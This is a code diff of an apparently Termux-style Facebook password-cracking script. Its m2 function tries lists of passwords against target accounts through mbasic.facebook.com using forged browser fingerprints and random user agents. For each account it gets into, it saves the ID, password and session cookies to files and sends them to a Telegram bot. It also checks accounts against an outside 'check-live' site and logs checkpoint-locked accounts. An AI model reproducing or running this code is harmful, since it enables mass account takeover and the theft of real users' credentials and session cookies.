@@ -767,7 +767,7 @@ usragent=[]
 for xd in range(10000):
         aa='Mozilla/5.0 (X11; Linux x86_64'
         b=random.choice(['6','7','8','9','10','11','12','13'])
-        c=f' TL-tl; {str(samsung)}'
+        c=f' TL-tl; {str(samsung1)}'
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
         h=random.randrange(100,114)
         i='0'
@@ -1130,84 +1130,78 @@ def m2(ids,pwv):
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    session = requests.Session()
-    ua = ua_valid()
+    ua =usragnt
+    pro = random.choice(usragent)
     warna = random.choice(my_color)
-    nip=random.choice(proxsi)
-    proxs= {'http': 'socks4://'+nip}
-    DOMAIN = ("m","business","mbasic")
-    fb= random.choice(DOMAIN)
-    uger = random.choice(ugrn)
     try:
         for pas in pwv:
-            free_fb = session.get(f'https://m.facebook.com').text
+            session = requests.Session()
+            free_fb = session.get(f"https://mbasic.facebook.com").text
             info={
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
-            "login":"Log In"}
+    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+    "try_number": 0,
+    "unrecognized_tries": 0,
+    "email": ids,
+    "prefill_contact_point": ids,
+    "prefill_source": "browser_dropdown",
+    "prefill_type": "contact_point",
+    "first_prefill_source": "browser_dropdown",
+    "first_prefill_type": "contact_point",
+    "had_cp_prefilled": True,
+    "had_password_prefilled": False,
+    "is_smart_lock": False,
+    "bi_xrwh": 0,
+    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
+    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
             update={
-            'authority': f'm.facebook.com',
-            'method': 'POST',  # Assuming this is a POST request
-            'path': '/',      # Assuming this is the path of the request
-            'scheme': 'https',
-            'accept': '*/*',
-            'accept-language': 'es-MX,es;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '2.75',
-            'origin': f'https://m.facebook.com',
-            'referer': f'https://m.facebook.com/?locale2=en_GB',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
-            'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"23128PC33I"',
-            'sec-ch-ua-platform': 'Android',
-            'sec-ch-ua-platform-version': '"8.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': uger,
-            'viewport-width': '393',
-            'x-asbd-id': '129477',
-            'x-fb-lsd': 'AVq9MsDYu_k',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream'}
-            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,allow_redirects=False).text
+            'User-Agent': "Mozilla/5.0 (Linux; Android 14; 23076PC4BI Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36",
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://lm.facebook.com/',
+            'DNT': '1',
+            'Pragma': 'no-cache',
+            'TE': 'Trailers', }
+            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
             log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+            if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
-                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                        cek_apk(kuki)
-                        statusok = (f" {cid} | {pas} | {coki} ")
-                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                        oks.append(cid)
-                        break
+                check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
+                bithi = requests.get(check).text
+                if 'LIVE' in bithi:
+                     print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                     print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                     cek_apk(kuki)
+                     statusok = (f" {cid} | {pas} | {coki} ")
+                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                     open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                     oks.append(cid)
+                     break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
+                uid = "1000"+coki1[0:11]
                 if 'y' in cp_xdx:
-                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
-                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
-                        cps.append(uid)
+                         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{pas}')
+                         open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
+                         cps.append(uid)
             else:
                 continue
             time.sleep(0.01)
         loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(7)
-    except Exception as e:
+ 
+    except:
         pass
 
 def m3(ids,pwv):
